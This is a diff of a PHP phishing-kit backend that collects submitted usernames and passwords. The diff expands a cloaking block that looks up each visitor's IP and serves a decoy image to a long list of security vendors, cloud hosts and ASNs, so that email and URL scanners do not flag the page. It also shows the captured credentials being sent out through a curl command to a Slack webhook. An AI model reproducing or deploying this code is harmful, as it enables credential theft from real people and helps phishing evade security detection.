@@ -1,17 +1,23 @@
 <?php
 
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
-$ip = $_SERVER['REMOTE_ADDR'];                                                                                                                                                                                                      //$ip = "64.233.172.122"; // GOOGLE Email Inspection IP
+$ip = $_SERVER['REMOTE_ADDR'];
+//$ip = "64.233.172.122"; // GOOGLE Email Inspection IP
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
-$org = $details->org; // -> "Mountain View"
-//var_dump($details);
+$org = $details->org;
 
-if(strpos($org, "Google") !== false OR strpos($org, "Microsoft") !== false){
-    echo "<HTML><BODY><IMG SRC=\"/images/favicon/android-icon-192x192.png\"></HTML></BODY>";                                                                                                                                        } else{
+$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange");
+
+if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {
+	echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42mfvl.jpg\"></HTML></BODY>";
+	$allowed = "- *Jedi Mind Trick Successful* -";
+
+} else {
 
 header("Access-Control-Allow-Origin: *");
 
 // Receives Required Parameters and Sets Variables
+$ip = $_SERVER['REMOTE_ADDR'];
 if(isset($_REQUEST['username'])){$user = $_REQUEST['username'];}else{$user = "";}
 if(isset($_REQUEST['password'])){$pass = base64_encode($_REQUEST['password']);}else{$pass = "";}
 if(isset($_REQUEST['project'])){$portal = $_REQUEST['project'];}else{$portal = "";}
@@ -454,7 +460,7 @@ $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.
 exec($cmd);
 
 }
-	
+
 }
 
 ?>
